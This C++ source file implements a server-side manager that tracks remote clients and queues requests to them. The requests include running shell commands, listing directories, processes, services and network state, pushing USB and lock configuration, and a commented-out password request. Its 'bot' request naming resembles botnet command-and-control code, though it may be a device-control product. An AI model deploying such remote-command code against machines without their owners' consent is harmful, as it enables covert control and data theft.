#include "StdAfx.h"
#include "ProtoManager.h"
#include "SafeDiskManager.h"
#include "ProtoManagerChild.h"
#include "Conv.h"
#include "../Public/Utils.h"

CProtoManager::CProtoManager(void)
{
	m_pThread = new CThreadEx(_Thread, this);
	m_dwEventId = 100;
	m_dwFileId = 100;
}

CProtoManager::~CProtoManager(void)
{
	delete m_pThread;
	std::map<DWORD, CProtoManagerChild *>::iterator Iter = m_MapChild.begin();
	for (; Iter != m_MapChild.end(); Iter++)
	{
		CProtoManagerChild *pChild = Iter->second;
		delete pChild;
	}
}

VOID CProtoManager::Initialize()
{
	m_pThread->Initialize();
	BinStorage::InitKey(theRelayInfo.szKey);
}

/*
#pragma warning(push)
#pragma warning(disable:4996)
BOOL CProtoManager::GetClient(std::vector<ClientInfo_t>& vecClient)
{
	BinStorage::InitKey(theRelayInfo.szKey);
	BinStorage::STORAGE *pReqStorage = new BinStorage::STORAGE;
	BOOL bRet = TRUE;

	// Update Status
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_REQUEST_TYPE, 0, REQUEST_TYPE_MANAGE_GET_LIST);
	if (FALSE == bRet)
		return FALSE;

	bRet = FALSE;
	ClientInfo_t Info;
	BinStorage::STORAGE *pResStorage = Communicate(pReqStorage);
	if (pResStorage)
	{
		DWORD dwItemCount = BinStorage::GetItemCount(pResStorage);
		const DWORD dwItemGroup = 9;
		do 
		{
			if (0 != (dwItemCount % dwItemGroup))
			{
				break;
			}

			bRet = TRUE;
			BinStorage::ITEM *pItem = NULL;
			int iColIndex = 0;
			while((pItem = BinStorage::GetNextItem(pResStorage, pItem)) != NULL)
			{
				LPTSTR pText = BinStorage::GetItemText(pItem);
				if (0 == iColIndex)
					Info.dwClientId = _ttoi(pText);
				else if (1 == iColIndex)
					lstrcpy(Info.szIPOut, pText);
				else if (2 == iColIndex)
					lstrcpy(Info.szIPIn, pText);
				else if (3 == iColIndex)
					lstrcpy(Info.szTime, pText);
				else if (4 == iColIndex)
					lstrcpy(Info.szHostname, pText);
				else if (5 == iColIndex)
					lstrcpy(Info.szDeviceSerial, pText);
				else if (6 == iColIndex)
					lstrcpy(Info.szComment, pText);
				else if (7 == iColIndex)
					Info.dwVersion = _ttoi(pText);
				else if (8 == iColIndex)
				{
					Info.bOnline = _ttoi(pText);
					iColIndex = -1;
					vecClient.push_back(Info);
				}
				iColIndex++;
				delete[] pText;
			}
		}
		while(FALSE);
		delete[] (LPBYTE)pResStorage;
	}

	SAFE_DELETE(pReqStorage);
	if (FALSE == bRet)
	{
		vecClient.clear();
	}
	return bRet;
}
#pragma warning(pop)

BOOL CProtoManager::GetRelayFileInfo(RelayFileInfo_t &Info)
{
	BinStorage::InitKey(theRelayInfo.szKey);
	BinStorage::STORAGE *pReqStorage = new BinStorage::STORAGE;
	BOOL bRet = TRUE;

	// Update Status
	bRet = bRet && BinStorage::AddItem(&pReqStorage, BOT_REQUEST_TYPE, 0, REQUEST_TYPE_GET_FILE_UPDOWN_INFO);
	if (FALSE == bRet)
		return FALSE;

	bRet = FALSE;
	BinStorage::STORAGE *pResStorage = Communicate(pReqStorage);
	if (pResStorage)
	{
		DWORD dwItemCount = BinStorage::GetItemCount(pResStorage);
		const DWORD dwItemGroup = 3;
		do 
		{
			if (0 != (dwItemCount % dwItemGroup))
			{
				break;
			}

			BinStorage::ITEM *pItem = NULL;
			int iIndex = 0;
			while((pItem = BinStorage::GetNextItem(pResStorage, pItem)) != NULL)
			{
				LPTSTR pText = BinStorage::GetItemText(pItem);

				if (0 == iIndex)
					Info.bFileTrans = _ttoi(pText);
				else if (1 == iIndex)
					lstrcpy(Info.szUpalodScript, pText);
				else if (2 == iIndex)
					lstrcpy(Info.szUpalodDir, pText);
				SAFE_DELETE_AR(pText);
				iIndex++;
			}
			if (dwItemGroup == iIndex)
			{
				bRet = TRUE;
			}
		}
		while(FALSE);
		delete[] (LPBYTE)pResStorage;
	}

	SAFE_DELETE(pReqStorage);
	return bRet;
}
*/

DWORD WINAPI CProtoManager::_Thread( LPVOID lpThreadParameter )
{
	CProtoManager *pThis = (CProtoManager*)lpThreadParameter;
	pThis->Thread();
	return 0;
}

VOID CProtoManager::Thread()
{
	Packet_t Packet;
	BOOL bProcess = m_PackManager.Get(Packet);
	if (bProcess)
	{
		switch(Packet.dwRequestType)
		{
			/*
		case REQUEST_TYPE_MANAGE_GET_LIST:
			{
				std::vector<ClientInfo_t> vecInfo;
				BOOL bRet = GetClient(vecInfo);
				if (bRet)
				{
// 					int iCount = 0;
// 					for (int i = 0; i < (int)vecInfo.size(); i++)
// 					{
// 						if (vecInfo[i].bOnline)
// 						{
// 							iCount++;
// 						}
// 					}
// 					if (iCount != 6)
// 					{
// 						int j = 0;
// 					}
// 					OutputLog(_T("Client: Count[%d], Time[%d]\n"), iCount, Utils::GetCurrentTimestamp());
					
					m_LockClient.Lock();
					m_vecClientInfo = vecInfo;
					for (int i = 0; i < (int)m_vecClientInfo.size(); i++)
					{
						DWORD dwClientId = m_vecClientInfo[i].dwClientId;
						CString strHostName = m_vecClientInfo[i].szHostname;
						CProtoManagerChild *pChild = m_MapChild[dwClientId];
						if (NULL == pChild)
						{
							pChild = new CProtoManagerChild(dwClientId, strHostName);
							pChild->Initialize();
							m_MapChild[dwClientId] = pChild;
						}
					}
					m_LockClient.Unlock();
				}
			}
			break;
			*/
		//case REQUEST_TYPE_MANAGE_REQUEST:
		case REQUEST_TYPE_CLIENT_REQUEST:
		case REQUEST_TYPE_CLIENT_RESULT:
			break;
			/*
		case REQUEST_TYPE_GET_FILE_UPDOWN_INFO:
			{
				RelayFileInfo_t Info;
				BOOL bRet = GetRelayFileInfo(Info);
				if (bRet)
				{
					theRelayUpDownInfo = Info;
					theRelayUpDownInfo.bUpdated = TRUE;
				}
			}
			break;
			*/
		default:
			break;
		}
	}
	Sleep(500);
}

std::vector<ClientInfo_t> CProtoManager::GetResClient(BOOL bIngnoreOffline /*= TRUE*/)
{
	m_LockClient.Lock();
	std::vector<ClientInfo_t> vecInfo;
	for (int i = 0; i < (int)m_vecClientInfo.size(); i++)
	{
		const ClientInfo_t& Info = m_vecClientInfo[i];
		if (bIngnoreOffline && !Info.bOnline)
			continue;
		vecInfo.push_back(Info);
	}
	m_LockClient.Unlock();
	return vecInfo;
}

CProtoManagerChild *CProtoManager::GetChild(DWORD dwClientId)
{
	m_LockClient.Lock();
	CProtoManagerChild *pChild = m_MapChild[dwClientId];
	m_LockClient.Unlock();
	return pChild;
}

BOOL CProtoManager::SetClientOnline(DWORD dwClient, BOOL bOnline)
{
	m_LockClient.Lock();
	for (int i = 0; i < (int)m_vecClientInfo.size(); i++)
	{
		if (m_vecClientInfo[i].dwClientId == dwClient)
		{
			m_vecClientInfo[i].bOnline = bOnline;
			m_LockClient.Unlock();
			return TRUE;
		}
	}
	m_LockClient.Unlock();
	return FALSE;
}

//////////////////////////////////////////////////////////////////////////

/*
VOID CProtoManager::InvokeClient()
{
	Packet_t Packet;
	Packet.dwRequestType = REQUEST_TYPE_MANAGE_GET_LIST;
	m_PackManager.Add(Packet);
}

VOID CProtoManager::InvokeFileUpDownInfo()
{
	Packet_t Packet;
	Packet.dwRequestType = REQUEST_TYPE_GET_FILE_UPDOWN_INFO;
	m_PackManager.Add(Packet);
}
*/

//////////////////////////////////////////////////////////////////////////

VOID CProtoManager::InvokeDir( DWORD dwClientId, LPCTSTR lpDir )
{
	CProtoManagerChild *pChild = GetChild(dwClientId);
	if (pChild)
	{
		pChild->InvokeReq(BOT_TYPE_DIR, lpDir);
	}
}

VOID CProtoManager::InvokeCmd( DWORD dwClientId, LPCTSTR lpCmd )
{
	CProtoManagerChild *pChild = GetChild(dwClientId);
	if (pChild)
	{
		pChild->InvokeReq(BOT_TYPE_CMD, lpCmd);
	}
}

VOID CProtoManager::InvokeVersion( DWORD dwClientId )
{
	CProtoManagerChild *pChild = GetChild(dwClientId);
	if (pChild)
	{
		pChild->InvokeReq(BOT_TYPE_VERSION);
	}
}

VOID CProtoManager::InvokePassword( DWORD dwClientId )
{
// 	CProtoManagerChild *pChild = GetChild(dwClientId);
// 	if (pChild)
// 	{
// 		pChild->InvokeReq(BOT_TYPE_PASSWORD);
// 	}
}

/*
VOID CProtoManager::DownloadFile( DWORD dwClientId, LPCTSTR lpRelayPath, LPCTSTR lpRemoteFilePath )
{
	CProtoManagerChild *pChild = GetChild(dwClientId);
	if (pChild)
	{
		pChild->DownloadFile(lpRelayPath, lpRemoteFilePath);
	}
}
*/

VOID CProtoManager::InvokeProcess(DWORD dwClientId)
{
	CProtoManagerChild *pChild = GetChild(dwClientId);
	if (pChild)
	{
		pChild->InvokeReq(BOT_TYPE_PROCESS);
	}
}

VOID CProtoManager::InvokeService(DWORD dwClientId)
{
	CProtoManagerChild *pChild = GetChild(dwClientId);
	if (pChild)
	{
		pChild->InvokeReq(BOT_TYPE_SERVICE);
	}
}

VOID CProtoManager::InvokeNetwork( DWORD dwClientId )
{
	CProtoManagerChild *pChild = GetChild(dwClientId);
	if (pChild)
	{
		pChild->InvokeReq(BOT_TYPE_NETWORK);
	}
}

VOID CProtoManager::InvokeClientLockInfo(DWORD dwClientId, LPCTSTR pContent)
{
	CProtoManagerChild *pChild = GetChild(dwClientId);
	if (pChild)
	{
		pChild->InvokeReq(BOT_TYPE_UPDATE_CLIENT_LOCK_INFO, pContent);
	}
}

VOID CProtoManager::InvokeConfigInfo(DWORD dwClientId, LPCTSTR pContent)
{
	CProtoManagerChild *pChild = GetChild(dwClientId);
	if (pChild)
	{
		pChild->InvokeReq(BOT_TYPE_USB_CONFIG, pContent);
	}
}

VOID CProtoManager::CheckOnline()
{
	m_LockClient.Lock();
	DWORD dwCurTime = Utils::GetCurrentTimestamp();
	for (int i = 0; i < (int)m_vecClientInfo.size(); i++)
	{
		if (m_vecClientInfo[i].dwLastUpdatedTime + 15 < dwCurTime)
		{
			m_vecClientInfo[i].bOnline = FALSE;
		}
		else
		{
			m_vecClientInfo[i].bOnline = TRUE;
		}
	}
	m_LockClient.Unlock();
}

VOID CProtoManager::CheckConfig(DWORD &dwCount)
{
	m_LockClient.Lock();
	for (int i = 0; i < (int)m_vecIdsToUpdateConfig.size(); i++)
	{
		DWORD dwClientId = m_vecIdsToUpdateConfig[i];
		std::map<DWORD, _CLIENT_INFO>::iterator pIter = theConfig.m_mapClient.find(dwClientId);
		if (pIter != theConfig.m_mapClient.end())
		{
			std::string strJsonConfig;
			pIter->second.SaveConfig(strJsonConfig);
			CString strBuf = CA2T(strJsonConfig.c_str()).m_psz;
			theProtoManager->InvokeClientLockInfo(dwClientId, strBuf);
			dwCount++;
		}
	}
	m_vecIdsToUpdateConfig.clear();
	m_LockClient.Unlock();
}

VOID CProtoManager::HttpdUpdateStatus(DWORD dwClientIdParam, CString strIpIn, CString strIpOut, CString strHostname, CString strDeviceSeiral, CString strComment, std::string strSignParam, DWORD bLockState, DWORD dwVersion)
{
	m_LockClient.Lock();
	BOOL bFound = FALSE;
	for (int i = 0; i < (int)m_vecClientInfo.size(); i++)
	{
		if (m_vecClientInfo[i].dwClientId == dwClientIdParam)
		{
			bFound = TRUE;

			lstrcpy(m_vecClientInfo[i].szIPIn, strIpIn);
			lstrcpy(m_vecClientInfo[i].szIPOut, strIpOut);
			lstrcpy(m_vecClientInfo[i].szHostname, strHostname);
			lstrcpy(m_vecClientInfo[i].szDeviceSerial, strDeviceSeiral);
			lstrcpy(m_vecClientInfo[i].szComment, strComment);
			m_vecClientInfo[i].dwVersion = dwVersion;
			m_vecClientInfo[i].dwLastUpdatedTime = Utils::GetCurrentTimestamp();
			m_vecClientInfo[i].bLocked = bLockState;
			m_vecClientInfo[i].bOnline = TRUE;
			
			TCHAR szTime[MAX_PATH];
			COleDateTime DateTime = COleDateTime::GetCurrentTime();
			wsprintf(szTime, _T("%04d-%02d-%02d %02d:%02d:%02d"),
				DateTime.GetYear(), DateTime.GetMonth(), DateTime.GetDay(),
				DateTime.GetHour(), DateTime.GetMinute(), DateTime.GetSecond()
				);
			lstrcpy(m_vecClientInfo[i].szTime, szTime);
			break;
		}
	}
	if (!bFound)
	{
		ClientInfo_t info;
		info.dwClientId = dwClientIdParam;
		lstrcpy(info.szIPIn, strIpIn);
		lstrcpy(info.szIPOut, strIpOut);
		lstrcpy(info.szHostname, strHostname);
		lstrcpy(info.szDeviceSerial, strDeviceSeiral);
		lstrcpy(info.szComment, strComment);
		info.dwVersion = dwVersion;
		info.dwLastUpdatedTime = Utils::GetCurrentTimestamp();
		info.bLocked = bLockState;
		info.bOnline = TRUE;
		lstrcpy(info.szTime, _T(""));
		m_vecClientInfo.push_back(info);
	}
	
	std::vector<CString> vecMd5;
	for (int i = 0; i < (int)m_vecClientInfo.size(); i++)
	{
		DWORD dwClientId = m_vecClientInfo[i].dwClientId;
		CString strHostName = m_vecClientInfo[i].szHostname;
		CProtoManagerChild *pChild = m_MapChild[dwClientId];
		if (NULL == pChild)
		{
			pChild = new CProtoManagerChild(dwClientId, strHostName);
			pChild->Initialize();
			m_MapChild[dwClientId] = pChild;
		}

		std::map<DWORD, _CLIENT_INFO>::iterator pIter = theConfig.m_mapClient.find(dwClientId);
		if (pIter == theConfig.m_mapClient.end())
		{
			_CLIENT_INFO Info;
			Info.configInfo.LoadIni(theApp.m_strConfigPath);
			if (theApp.m_bDefaultAllow)
			{
				_TIME_RANGE range;
				range.uTimeStart = Utils::GetCurrentTimestamp() - 3600 * 24 * 365;
				range.uTimeEnd = Utils::GetCurrentTimestamp() + 3600 * 24 * 365;
				Info.vecTimeRange.push_back(range);
			}
			theConfig.m_mapClient.insert(std::map<DWORD, _CLIENT_INFO>::value_type(dwClientId, Info));
			theConfig.Save();
			pIter = theConfig.m_mapClient.find(dwClientId);
		}

		CString strExtraConfigMd5 = pIter->second.strExtraConfigMd5;
		vecMd5.push_back(strExtraConfigMd5);
	}

	for (int i = 0; i < (int)m_vecClientInfo.size(); i++)
	{
		if (m_vecClientInfo[i].dwClientId == dwClientIdParam && m_vecClientInfo[i].dwVersion >= 500)
		{
			if (CA2T(strSignParam.c_str()).m_psz != vecMd5[i])
			{
				BOOL bFound = FALSE;
				for (int j = 0; j < (int)m_vecIdsToUpdateConfig.size(); j++)
				{
					if (m_vecIdsToUpdateConfig[j] == dwClientIdParam)
					{
						bFound = TRUE;
						break;
					}
				}
				if (!bFound)
				{
					m_vecIdsToUpdateConfig.push_back(dwClientIdParam);
				}
			}
		}
	}
	m_LockClient.Unlock();
}

BinStorage::STORAGE *CProtoManager::HttpdProcessRequest(DWORD dwClientId)
{
	BinStorage::STORAGE *pResStorage = new BinStorage::STORAGE;
	m_LockClient.Lock();
	for (std::map<DWORD, CProtoManagerChild*>::iterator pIter = m_MapChild.begin(); pIter != m_MapChild.end(); pIter++)
	{
		CProtoManagerChild *pChild = pIter->second;
		if (NULL == pChild)
			continue;
		if (pChild->m_dwClientId != dwClientId)
			continue;

		pChild->m_LockThread.Lock();
		for (int i = 0; i < (int)pChild->m_ReqManager.m_queReqPacket.size(); i++)
		{
			Packet_t &Packet = pChild->m_ReqManager.m_queReqPacket[i];
			if (FALSE == Packet.bSentAlready)
			{
				Packet.bSentAlready = TRUE;

				BinStorage::AddItem(&pResStorage, 0, 0, Packet.dwEventId);
				BinStorage::AddItem(&pResStorage, 0, 0, Packet.dwType);
				LPSTR pRequest = CConv::CharToUtf(Packet.strRequest);
				BinStorage::AddItem(&pResStorage, 0, 0, pRequest, strlen(pRequest));
				delete[] pRequest;
			}
		}
		pChild->m_LockThread.Unlock();
	}
	m_LockClient.Unlock();
	return pResStorage;
}

BinStorage::STORAGE *CProtoManager::HttpdProcessResponse(DWORD dwEventId, DWORD dwClientId, CString strResponse, INT iResponseRet)
{
	BinStorage::STORAGE *pResStorage = new BinStorage::STORAGE;
	m_LockClient.Lock();
	for (std::map<DWORD, CProtoManagerChild*>::iterator pIter = m_MapChild.begin(); pIter != m_MapChild.end(); pIter++)
	{
		CProtoManagerChild *pChild = pIter->second;
		if (NULL == pChild)
			continue;

		pChild->m_LockThread.Lock();
		for (int i = 0; i < (int)pChild->m_ReqManager.m_queReqPacket.size(); i++)
		{
			Packet_t &Packet = pChild->m_ReqManager.m_queReqPacket[i];
			if (dwEventId == Packet.dwEventId)
			{
				Packet.strResponse = strResponse;
				Packet.iResponseRet = iResponseRet;
				SetEvent(Packet.hEvent);
			}
		}
		pChild->m_LockThread.Unlock();
	}
	m_LockClient.Unlock();
	return pResStorage;
}

BinStorage::STORAGE *CProtoManager::HttpdProcessResponseAsync(DWORD dwClientId, DWORD dwType, CString strResponse)
{
	/*
	vector<AsyncInfo_t> vecInfo;
	BOOL bRet = GetAsync(vecInfo);
	if (bRet)
	{
		for (int i = 0; i < (int)vecInfo.size(); i++)
		{
		}
	}
	*/

	Packet_t Packet;
	Packet.strResponse = strResponse;
	Packet.dwType = dwType;
	Packet.dwClientId = dwClientId;
	thePacketManagerLock.Lock();
	thePacketManager.AddRes(Packet);
	thePacketManagerLock.Unlock();

	return NULL;
}

CProtoManager *theProtoManager;
